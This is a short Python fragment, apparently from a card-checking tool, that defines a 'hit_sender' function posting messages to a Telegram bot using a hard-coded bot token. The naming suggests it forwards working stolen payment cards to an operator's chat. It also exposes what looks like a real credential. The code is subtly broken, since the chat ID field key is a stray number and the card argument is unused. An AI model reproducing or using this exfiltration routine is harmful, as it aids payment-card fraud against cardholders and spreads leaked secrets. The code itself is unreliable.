import requests

def hit_sender(card,message,chat_id):
    bot_token = '7740237222:AAEUJJBK7iLOMYTsox9epp7iG2unPQvYXmY'
    url = f'https://api.telegram.org/bot7740237222:AAEUJJBK7iLOMYTsox9epp7iG2unPQvYXmY/sendMessage'
    data = {'7237320756': chat_id, 'text': message}
    requests.post(url, data=data)
